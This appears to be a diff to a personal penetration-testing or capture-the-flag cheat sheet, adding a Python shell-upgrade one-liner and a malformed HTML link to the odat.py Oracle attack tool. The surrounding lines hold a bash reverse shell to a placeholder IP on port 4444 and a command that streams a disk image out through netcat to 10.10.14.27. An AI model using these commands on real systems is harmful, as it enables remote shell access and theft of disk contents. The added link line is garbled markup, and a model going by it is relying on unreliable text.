@@ -52,6 +52,7 @@ bash -c 'bash -i >& /dev/tcp/<your_ip>/4444 0>&1'
 ó
 python3 -c "import pty; pty.spawn('/bin/bash')"
 python3 -c 'import pty; pty.spawn("/bin/sh")'
+python -c 'import pty;pty.spawn("/bin/bash");'
 
 ************************************************************* Scan web*********************************
 
@@ -229,4 +230,5 @@ dd if=dm-0 gzip -1 - | nc 10.10.14.27 8003
 gunzip disk.img.gz
 mount disk.img /mnt
 
+<a class="vglnk"https://github.com/quentinhardy/odat"rel="nofollow"><span>odat.py</span>
 
